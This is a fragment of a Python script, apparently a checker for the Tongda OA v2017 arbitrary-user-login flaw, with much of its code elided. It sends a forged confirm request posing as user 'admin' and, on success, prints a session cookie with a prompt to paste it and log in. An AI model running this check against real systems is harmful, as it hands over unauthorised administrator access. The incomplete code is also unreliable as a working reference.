...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测通达OA_v2017_任意用户登录漏洞")
    try:
        ...
        response = requests.post(codeScanUrl,
                                 data={'codeuid': codeUid, 'uid': int(1), 'source': 'pc', 'type': 'confirm',
                                       'username': 'admin'}, headers=headers)
        resText = json.loads(response.text)
        ...
        if status == str(1):
            ...
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print(now_time() + ' [SUCCESS]  存在通达OA_v2017_任意用户登录漏洞,粘贴cookie尝试登录:{}'.format(
                        tmp_cookie))

                else:
                    print(now_time() + " [WARNING]  不存在通达OA_v2017_任意用户登录漏洞")
            else:
                print(now_time() + " [WARNING]  不存在通达OA_v2017_任意用户登录漏洞")
    except:
